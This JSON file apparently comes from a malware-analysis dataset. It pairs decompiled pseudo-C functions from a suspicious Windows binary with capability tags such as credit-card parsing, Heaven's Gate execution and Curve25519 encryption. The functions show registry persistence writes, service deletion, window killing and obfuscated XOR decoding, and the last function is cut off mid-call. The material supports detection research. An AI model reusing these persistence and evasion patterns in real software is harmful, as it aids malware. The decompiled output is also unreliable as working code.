{
    "00401070": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401070(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        iVar2 = 1;\n        do {\n            uVar1 = *(iVar2 % arg_ch + arg_8h);\n            *(arg_18h + -1 + iVar2) = var_ch ^ *(var_8h + arg_10h) ^ *((iVar2 + -1) % arg_ch + arg_8h);\n            *(iVar2 + arg_18h) = var_ch ^ uVar1;\n            var_8h = var_8h + 1;\n            iVar2 = iVar2 + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "00402940": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402940(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(*0x10 + -0x10c, 0x28);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x28c0, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 392
    },
    "00401200": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401248) overlaps instruction at (ram,0x00401246)\n// \n\nuint fcn.00401200(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint unaff_EBX;\n    bool bVar4;\n    uint *puVar5;\n    \n    uVar2 = param_2;\n    uVar1 = param_1;\n    puVar5 = &param_1;\n    puVar3 = fcn.00404ee0(param_1, param_2, puVar5, &param_2);\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    bVar4 = (unaff_EBX >> 8) + '0' < '\\0';\n    puVar3[0x16] = param_2;\n    if ((bVar4) || (!bVar4)) {\n        puVar3 = &param_2;\n        puVar5 = &param_1;\n    }\n    *(puVar3 + -0x72f3ba22) = *(puVar3 + -0x72f3ba22) | param_2;\n    fcn.00404ee0(uVar1, uVar2, puVar5);\n    return 1;\n}\n",
        "token_count": 294
    },
    "00401270": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e",
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004013b7) overlaps instruction at (ram,0x004013b6)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x004013b7)\n// WARNING: Removing unreachable block (ram,0x004014b4)\n// WARNING: Removing unreachable block (ram,0x004014c7)\n// WARNING: Removing unreachable block (ram,0x004014c9)\n// WARNING: Removing unreachable block (ram,0x004014d2)\n// WARNING: Removing unreachable block (ram,0x004014da)\n// WARNING: Removing unreachable block (ram,0x004014e3)\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401270(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint32_t in_EAX;\n    uchar *puVar3;\n    uint8_t uVar4;\n    uint32_t in_EDX;\n    uint8_t uVar5;\n    uint unaff_EBX;\n    uchar *puVar6;\n    uint32_t *unaff_EDI;\n    ushort in_SS;\n    bool bVar7;\n    bool bVar8;\n    float10 in_ST0;\n    uint var_67h;\n    uint var_4h;\n    \n    bVar8 = -1 < in_EAX + -1;\n    *arg_8h = 0x12;\n    if ((bVar8) && (!bVar8)) {\n        *(unaff_EDI + 7) = in_ST0;\n        unaff_EDI = unaff_EDI + 5;\n    }\n    arg_8h[1] = 0x5e;\n    arg_8h[2] = 0x8f;\n    uVar2 = in_EDX >> 8;\n    bVar8 = (POPCOUNT(uVar2 & 0x12) & 1U) == 0;\n    arg_8h[3] = 0x70;\n    if ((bVar8) || (!bVar8)) {\n        arg_8h[4] = 0x5e;\n        puVar6 = arg_8h;\n    }\n    else {\n        in_EAX = in_EAX & 0xffffff00 | in_EAX + 0x5e;\n        puVar6 = arg_8h + 0x46;\n    }\n    uVar4 = unaff_EBX >> 8;\n    bVar8 = SBORROW1(uVar4 ^ 0x16 | in_EAX >> 8, uVar2);\n    puVar6[5] = 0x18;\n    if ((!bVar8) && (bVar8)) {\n        LOCK();\n        puVar6 = 0x138b2633;\n        in_EAX = in_EAX + 0x658f517f;\n    }\n    puVar6[6] = 0xce;\n    uVar5 = uVar4 ^ 0x16 | in_EAX >> 8;\n    puVar6[7] = 0xad;\n    if ((uVar2 < uVar5) && (uVar5 <= uVar2)) {\n        puVar3 = arg_8h & 0xffff0000 | CONCAT11(arg_8h >> 8 | uVar4, arg_8h);\n    }\n    else {\n        puVar6[8] = 0xfd;\n        puVar3 = arg_8h;\n    }\n    uVar2 = puVar3 >> 8;\n    puVar6[9] = 0x71;\n    puVar6[10] = 0x59;\n    puVar6[0xb] = 0x89;\n    uVar4 = in_EDX;\n    puVar6[0xc] = 0x33;\n    if (('P' < uVar4) && (uVar4 < 'Q')) {\n        out(0xc4, in_EAX);\n        in_EDX = in_EDX & 0xffffff00 | uVar4 ^ puVar3;\n        *unaff_EDI = in_EAX;\n    }\n    puVar6[0xd] = 0xb6;\n    puVar6[0xe] = 0x1a;\n    if ((0x51 < in_EDX) && (in_EDX < 0x52)) {\n        in_EAX = in_EAX & 0xe2f4cc58;\n    }\n    puVar6[0xf] = 0xd8;\n    puVar6[0x10] = 0xd1;\n    bVar8 = (puVar3 & 0xffff0000 | puVar3 & 0xff | uVar2 - unaff_EBX << 8) < in_EDX;\n    arg_8h[0x11] = 0x7f;\n    do {\n        arg_8h[0x12] = 0x15;\n        bVar7 = in_EAX == '\\x01';\n        arg_8h[0x13] = 0x1c;\n        if ((!bVar7) && (bVar7)) {\n            out(*puVar6, in_EDX);\n            puVar6 = puVar6 + 1;\n        }\n        arg_8h[0x14] = 0x9e;\n        if ((!bVar8 && !bVar7) && (bVar8 || bVar7)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        arg_8h[0x15] = 0x87;\n        bVar8 = false;\n        bVar7 = (POPCOUNT(uVar2 ^ unaff_EBX) & 1U) == 0;\n        arg_8h[0x16] = 0xef;\n        if ((bVar7) || (!bVar7)) goto code_r0x00401493;\n        puVar1 = segment(in_SS, *0x10 + -0xc);\n        in_EAX = *puVar1;\n        in_EDX = 0xb7bc9ea5;\n    } while (bVar7);\n    *((&stack0xfffffff4 ^ puVar6) - 4) = 0xb7bc9ea5;\ncode_r0x00401493:\n    *arg_ch = 0x17;\n    return;\n}\n",
        "token_count": 1438
    },
    "00401bb0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681",
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d4a) overlaps instruction at (ram,0x00401d48)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00401bb0(uchar *arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint32_t in_ECX;\n    int32_t *piVar7;\n    uint16_t uVar8;\n    int32_t *in_EDX;\n    uint32_t uVar9;\n    uint unaff_EBX;\n    uint uVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    uchar *puVar14;\n    uint *puVar15;\n    ushort *puVar16;\n    uint16_t *puVar17;\n    uint32_t uVar18;\n    uchar *puVar19;\n    uint uVar20;\n    uint uVar21;\n    char *pcVar22;\n    char *pcVar23;\n    ushort uVar24;\n    uint16_t in_SS;\n    uint8_t in_AF;\n    bool bVar25;\n    unkbyte10 in_ST0;\n    uint32_t uStack28;\n    uint uStack24;\n    uint32_t uStack20;\n    uchar *puVar13;\n    \n    *arg_8h = 0x16;\n    arg_8h[1] = 0x95;\n    bVar25 = (in_EDX ^ unaff_EBX >> 8 | 0x67) == 0;\n    arg_8h[2] = 0x90;\n    if (bVar25) {\ncode_r0x00401bf7:\n        arg_8h[3] = 0x25;\n        uStack20 = in_ECX & 0xffff | arg_8h << 0x10;\n    }\n    else {\n        uStack20 = in_ECX & 0xffff | in_ECX << 0x10;\n        in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | in_ECX & 0xffff;\n        if (!bVar25) goto code_r0x00401bf7;\n    }\n    iVar11 = *0x51665066;\n    uStack24 = in_EDX & 0xffff0000 | in_SS;\n    uVar9 = uStack24;\n    uStack24 = 0x47;\n    *(&uStack28 + *0x51665066) = uVar9;\n    bVar25 = SBORROW1(in_ECX, '\\x01');\n    uVar21 = *(&uStack28 + *0x51665066);\n    uVar6 = *(&uStack24 + *0x51665066);\n    uVar9 = in_ECX & 0xffff0000 | uVar6;\n    puVar12 = &uStack20 + *0x51665066;\n    puVar13 = &uStack20 + *0x51665066;\n    arg_8h[4] = 7;\n    puVar14 = puVar12;\n    puVar19 = arg_8h;\n    if (!bVar25) {\n        *(&uStack24 + iVar11 + 2) = uVar6;\n        uVar9 = in_ECX & 0xffff0000 | *(&uStack24 + iVar11 + 2);\n        puVar14 = puVar13;\n        if (bVar25) {\n            LOCK();\n            puVar19 = 0x138b2633;\n            puVar14 = 0x1e26fa71;\n        }\n    }\n    puVar19[5] = 0xf0;\n    *(puVar14 + -2) = uVar9;\n    *(puVar14 + -6) = unaff_EBX;\n    *(puVar14 + -10) = puVar19;\n    piVar7 = puVar19 | 0x561b;\n    uVar20 = *(puVar14 + -10);\n    uVar10 = *(puVar14 + -6);\n    uVar6 = *(puVar14 + -2);\n    uVar4 = uVar9 & 0xffff0000 | uVar6;\n    arg_8h[6] = 0x3d;\n    if ((piVar7 < in_EDX) || (uVar4 = uVar9 & 0xffff0000 | uVar6 & 0xff | (uVar6 >> 8) << 8,  in_EDX <= piVar7)) {\n        arg_8h[7] = 0x2e;\n        *(puVar14 + -4) = arg_8h;\n        *(puVar14 + -8) = uVar4;\n        *(puVar14 + -0xc) = in_EDX;\n        *(puVar14 + -0x10) = uVar10;\n        *(puVar14 + -0x14) = puVar14;\n        *(puVar14 + -0x18) = &stack0xfffffffc;\n        *(puVar14 + -0x1c) = uVar20;\n        puVar15 = puVar14 + -0x20;\n        puVar14 = puVar14 + -0x20;\n        *puVar15 = uVar21;\n    }\n    *(arg_8h + -0x7ce92414) = in_ST0;\n    *(puVar14 + -4) = uVar10;\n    uVar3 = arg_8h + -1;\n    uVar2 = 9 < (uVar3 & 0xf) | in_AF;\n    uVar3 = uVar3 + uVar2 * '\\x06';\n    *in_EDX = *in_EDX + 0x40c6df84;\n    uVar24 = *(puVar14 + -4);\n    *(puVar14 + -4) =\n         arg_8h + -1 & 0xffffff00 | uVar3 + (0x90 < (uVar3 & 0xf0) | piVar7 < in_EDX | uVar2 * (0xf9 < uVar3)) * '`';\n    *(puVar14 + -8) = uVar4;\n    *(puVar14 + -0xc) = in_EDX;\n    *(puVar14 + -0x10) = uVar10;\n    *(puVar14 + -0x14) = puVar14;\n    *(puVar14 + -0x18) = &stack0xfffffffc;\n    *(puVar14 + -0x1c) = uVar20;\n    *(puVar14 + -0x20) = uVar21;\n    piVar7 = uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) - uVar10, uVar4);\n    bVar25 = (POPCOUNT(piVar7 - in_EDX & 0xff) & 1U) == 0;\n    pcVar22 = *(puVar14 + -0x20);\n    uVar10 = *(puVar14 + -0x1c);\n    uVar18 = *(puVar14 + -0x18);\n    uVar9 = *(puVar14 + -0xc);\n    uVar21 = *(puVar14 + -8);\n    uVar4 = *(puVar14 + -4);\n    iVar11 = *(uVar18 + 8);\n    *(iVar11 + 8) = 1;\n    if (bVar25) {\ncode_r0x00401cba:\n        *(iVar11 + 9) = 5;\n        if (in_EDX <= piVar7) {\n            *(puVar14 + -4) = pcVar22;\n            pcVar22 = *(puVar14 + -4);\n            if (piVar7 < in_EDX) {\n                uVar9 = uVar9 & 0xffffff00 | (uVar9 - iVar11) - (piVar7 < in_EDX);\n                puVar14 = puVar14 + 4;\n                goto code_r0x00401cad;\n            }\n        }\n    }\n    else {\n        *(puVar14 + -4) = pcVar22;\n        pcVar22 = *(puVar14 + -4);\n        if (!bVar25) goto code_r0x00401cba;\ncode_r0x00401cad:\n        uVar9 = uVar9 + 1;\n        uVar18 = *0xc617b43a;\n        iVar11 = iVar11 + 1;\n        *0xbf57197c = *0xbf57197c | uVar9;\n        uVar5 = (uVar9 & 0xffff0000 | CONCAT11(0x13, uVar9)) + 0x18107d5f;\n        puVar16 = puVar14 + -4;\n        puVar14 = puVar14 + -4;\n        *puVar16 = uVar24;\n        uVar10 = 0x34a96cf3;\n        pcVar23 = pcVar22 | uVar18;\n        pcVar22 = pcVar23 + 1;\n        *pcVar23 = uVar5;\n        uVar9 = uVar4 & 0xffffff00;\n        uVar4 = uVar5 & 0xffff0000 | uVar5 + (uVar5 >> 8) * 'y';\n    }\n    *(iVar11 + 10) = 0x2d;\n    *(puVar14 + -4) = uVar4;\n    *(puVar14 + -8) = uVar9;\n    *(puVar14 + -0xc) = uVar10;\n    bVar25 = (uVar4 + iVar11 | 0x11a9U) != 0;\n    puVar19 = *(puVar14 + -0xc);\n    uVar4 = *(puVar14 + -8);\n    uVar9 = *(puVar14 + -4);\n    *(iVar11 + 0xb) = 0xe;\n    if ((bVar25) && (!bVar25)) {\n        uVar9 = uVar9 & 0xe2f4cc58;\n    }\n    *(iVar11 + 0xc) = 0x91;\n    *(puVar14 + -4) = pcVar22;\n    *(puVar14 + -6) = uVar9;\n    *(puVar14 + -8) = uVar4;\n    uVar8 = *(puVar14 + -8);\n    uVar6 = *(puVar14 + -6);\n    *(iVar11 + 0xd) = 6;\n    *(puVar14 + -4) = uVar21;\n    *(puVar14 + -8) = uVar4 & 0xffff0000 | uVar8;\n    bVar25 = -1 < (uVar8 ^ iVar11 >> 8 | 0x67);\n    uVar5 = *(puVar14 + -8);\n    uVar4 = *(puVar14 + -4);\n    *(iVar11 + 0xe) = 0x60;\n    if (bVar25) {\n        *(puVar14 + -2) = uVar4;\n        uVar4 = uVar4 & 0xffff0000 | *(puVar14 + -2);\n        if (!bVar25) {\n            puVar1 = iVar11 + -0x3a;\n            iVar11 = iVar11 + 1;\n            puVar17 = (puVar14 ^ *puVar1) - 4;\n            *((puVar14 ^ *puVar1) - 4) = uVar4;\n            puVar19 = uVar9 & 0xffff0000 | uVar6;\n            goto code_r0x00401d51;\n        }\n    }\n    *(iVar11 + 0xf) = 0x16;\n    *(puVar14 + -4) = iVar11;\n    puVar17 = puVar14 + -6;\n    *(puVar14 + -6) = uVar4;\ncode_r0x00401d51:\n    puVar17[-1] = uVar5;\n    bVar25 = uVar4 >> 8 != iVar11;\n    uVar8 = puVar17[-1];\n    uVar6 = *puVar17;\n    uVar9 = *(uVar18 + 8);\n    *(uVar9 + 0x10) = 0xd7;\n    if ((bVar25) && (!bVar25)) {\n        uVar9 = uVar9 & 0xffffff00 | *0x4bb148d3;\n        out(*puVar19, uVar8);\n    }\n    *(uVar9 + 0x11) = 0x59;\n    *(puVar17 + 1) = uVar4 & 0xffff0000 | uVar6;\n    *(puVar17 + -1) = uVar5 & 0xffff0000 | uVar8;\n    uVar4 = *(puVar17 + -1);\n    uVar21 = *(puVar17 + 1);\n    *(uVar9 + 0x12) = 0x31;\n    puVar17[2] = uVar21;\n    puVar17[1] = uVar4;\n    *(puVar17 + -1) = uVar9;\n    uVar21 = *(puVar17 + -1);\n    uVar6 = puVar17[1];\n    **(uVar18 + 0xc) = 0x13;\n    return CONCAT44(uVar4 & 0xffff0000 | uVar6, uVar21);\n}\n",
        "token_count": 3014
    },
    "00401550": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401550(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &var_4h);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(*(uVar2 - 4));\n    return *(uVar2 - 8);\n}\n",
        "token_count": 236
    },
    "00402330": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402330(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x411794;\n    var_10h = 0x41178c;\n    var_ch = 0x41179c;\n    var_8h = 0x4117a4;\n    var_4h = 0x4117ac;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x411784);\n    return iVar1 == 0;\n}\n",
        "token_count": 291
    },
    "00404e70": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ed1) overlaps instruction at (ram,0x00404ecc)\n// \n\nint32_t __cdecl fcn.00404e70(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_CL;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n        *(iVar1 + 0x5639da56) = *(iVar1 + 0x5639da56) ^ extraout_CL;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 187
    },
    "004015f0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040164a) overlaps instruction at (ram,0x00401647)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004015f0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar4;\n    uint32_t *puVar3;\n    uint16_t in_CX;\n    int32_t iVar5;\n    bool bVar6;\n    uint uStack20;\n    \n    iVar5 = 0;\n    bVar6 = arg_14h == 0;\n    if (0 < arg_14h) {\n        do {\n            if ((bVar6) || (uStack20._2_2_ = in_CX,  !bVar6)) {\n                uStack20._2_2_ = arg_14h >> 0x10;\n            }\n            uStack20 = uStack20._2_2_ * 0x10000;\n            while( true ) {\n                puVar3 = CONCAT31(arg_8h >> 8, 0x98);\n                in_CX = 0x5d21;\n                *puVar3 = *puVar3 + -0x68;\n                puVar1 = iVar5 + 0x57;\n                uVar2 = *puVar1;\n                uVar4 = arg_8h >> 8;\n                *puVar1 = *puVar1 + uVar4;\n                if (!CARRY1(uVar2, uVar4)) break;\n                if (&stack0xfffffff0 < *puVar3 || puVar3 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            *(iVar5 + uStack20) = arg_14h ^ 0x21;\n            iVar5 = iVar5 + 1;\n            bVar6 = iVar5 == arg_14h;\n        } while (iVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 480
    },
    "00401690": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401690(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4113e0, arg_8h);\n    (*pcVar2)(&var_264h, 0x4113f8, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x411420;\n    var_30h = 0x41142c;\n    var_2ch = 0x411438;\n    var_28h = 0x411448;\n    var_24h = 0x411450;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1089
    },
    "004018f0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ae8) overlaps instruction at (ram,0x00401ae7)\n// \n// WARNING: Removing unreachable block (ram,0x00401935)\n// WARNING: Removing unreachable block (ram,0x0040193e)\n\nint32_t fcn.004018f0(int32_t *param_1)\n\n{\n    unkbyte6 Var1;\n    int32_t iVar2;\n    uchar *puVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint16_t in_ES;\n    ushort in_CS;\n    bool bVar10;\n    char cVar11;\n    char cVar12;\n    ulong uVar13;\n    uint32_t arg_8h;\n    uint16_t uVar14;\n    uint16_t uVar15;\n    ushort uVar16;\n    uint uStack531;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack8 [4];\n    \n    puVar8 = &stack0xfffffffc;\n    puVar9 = &uStack531;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    cVar12 = '\\0';\n    cVar11 = '\\0';\n    uStack272 = 0;\n    puVar9 = &uStack271;\n    for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    iVar6 = 1;\n    *(puVar9 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    iVar2 = (*_sym.imp.MSVCRT.dll_sprintf)();\n    if ((cVar12 == cVar11) && (cVar12 != cVar11)) {\n        puVar3 = 0x1;\n        puVar8 = &stack0xfffffffd;\n        iVar6 = iVar2;\n    }\n    else {\n        puVar3 = auStack8;\n    }\n    fcn.004014b0(puVar8 + -2, puVar3);\n    iVar2 = fcn.00401e30(param_1, puVar8[3], puVar8[4], puVar8[5], puVar8[-2], puVar8[-1]);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar13 = fcn.00403c10();\n    arg_8h = uVar13 >> 0x20;\n    if (uVar13 == 0) {\n        return 0;\n    }\n    uVar16 = unaff_EBX >> 0x10;\n    puVar7 = ((unaff_EBX ^ iVar6) >> 8) - 1 << 8;\n    uVar15 = unaff_EBX;\n    while( true ) {\n        uVar14 = uVar15;\n        bVar10 = false;\n        cVar11 = (puVar7 & 0xd00) == 0;\n        puVar7 = CONCAT22(uVar16, uVar14);\n        uVar15 = uVar14;\n        fcn.00404480();\n        if ((bVar10) || (!bVar10)) break;\n        if (extraout_ECX + -1 == 0 || cVar11 == '\\0') {\n            *param_1 = iVar6 + 4;\n            iVar6 = -0x7cffffd8;\n            Var1 = *(puVar7 + *0x9750e2b5 * 4);\n            in_ES = Var1 >> 0x20;\n            pcVar4 = Var1;\n            *0xe800410f = *(pcVar4 + param_1 + -0x45);\n            *0xe800410b = in_CS;\n            *pcVar4 = *pcVar4 + Var1;\n            puVar7 = puVar7 & 0xffffff00 | uVar14 + (extraout_ECX + -1 >> 8);\ncode_r0x00401a51:\n            iVar2 = fcn.00404300(0x4113b0);\n            uVar5 = iVar2 + 1U;\n            if (iVar2 + 1U != 0) {\n                puVar7 = 0xf;\ncode_r0x00401a68:\n                iVar2 = fcn.00403a50(param_1);\n                if (iVar2 != 0) {\n                    fcn.00403e50();\n                    fcn.00401540(puVar7);\n                    return 1;\n                }\n                uVar5 = *0x42481c;\n                if (*0x42481c == 0) {\n                    return 0;\n                }\n            }\n            bVar10 = (POPCOUNT(uVar5 & 0xff) & 1U) != 0;\n            if ((bVar10) && (!bVar10)) {\n                puVar9 = &stack0xffff9f65;\n                cVar11 = '\\x1e';\n                do {\n                    puVar8 = puVar8 + -1;\n                    puVar9 = puVar9 + -1;\n                    *puVar9 = *puVar8;\n                    cVar11 = cVar11 + -1;\n                } while ('\\0' < cVar11);\n                iVar6 = in(0x78);\n                return iVar6;\n            }\n            uVar5 = fcn.004048f0(param_1, puVar8 + -0x43);\n            if (uVar5 == 0) {\n                iVar6 = 0;\n            }\n            if (((uVar5 < 0x80000000) && (uVar5 >= 0x80000000)) || (bVar10 = iVar6 < 0,  iVar6 != 0)) {\n                iVar6 = uVar5 + 0xe40ce22a;\n                *puVar7 = *puVar7 & 0xc3;\n                uVar5 = fcn.004021d0(arg_8h);\n                bVar10 = uVar5 < 0;\n                if (uVar5 == 0) {\n                    iVar6 = 0;\n                    bVar10 = false;\n                }\n            }\n            if ((!bVar10) && (bVar10)) {\n                arg_8h = arg_8h & 0xffff0000 | in_ES;\n                iVar6 = iVar6 + -1;\n                puVar3 = param_1 | puVar8;\n                param_1 = puVar3 + 1;\n                *puVar3 = uVar5;\n            }\n            if (iVar6 == 0) {\n                iVar6 = fcn.00401690(param_1, 